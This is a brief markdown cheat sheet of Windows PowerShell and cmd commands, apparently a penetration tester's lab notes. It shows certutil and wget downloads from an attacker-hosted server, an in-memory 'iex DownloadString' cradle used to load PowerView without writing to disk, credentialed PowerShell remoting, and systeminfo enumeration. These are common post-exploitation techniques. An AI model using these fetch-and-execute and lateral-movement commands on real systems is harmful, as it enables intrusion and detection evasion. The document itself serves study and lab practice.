# Useful commandes with Powershell and cmd

## Powershell

### Downloading files

- `certutil.exe -urlcache -f http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need name-you-want-to-give-the-file`
  ```
  PS C:\Users\users\Desktop> certutil.exe -urlcache -f http://192.168.3.28/powerview.ps1 powerview.ps1
  ****  Online  ****
  CertUtil: -URLCache command completed successfully.
  ```
- `wget http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need -OutFile name-you-want-to-give-the-file`
  ```
  PS C:\Users\user\Desktop> wget http://192.168.3.28/powerview.ps1 -OutFile powerview.ps1
  ```
- `iex (New-Object Net.WebClient).DownloadString('http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need')` will load it in memory without writing it in the disk, we will the be able to run powerview command if we use it to load powerview for instance
  ```
  PS C:\Users\s.chisholm.mayorsec\Desktop> iex (New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')
  ```

### Powershell Remoting

- `Enter-PSSession -ComputerName workstation-01`
- `Enter-PSSession -ComputerName workstation-01 -Credential domain\Username`
- ` Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName workstation-01 -Credential domain\Username` connect to a remote powershell and excute command with ScriptBlock. other command we could do with scriptblock: `ipconfig`, `net user`,...

### Misc

- `Install-Module ActiveDirectoryModule -ScopeCurrentUser` Install a module without admin rights

## CMD

### Misc

- If we want to grep on specific information we can use `findstr`  
  `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`  
  ```
  c:\>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
  OS Name:                   Microsoft Windows 7 Enterprise 
  OS Version:                6.1.7600 N/A Build 7600
  System Type:               X86-based PC
  ```
  
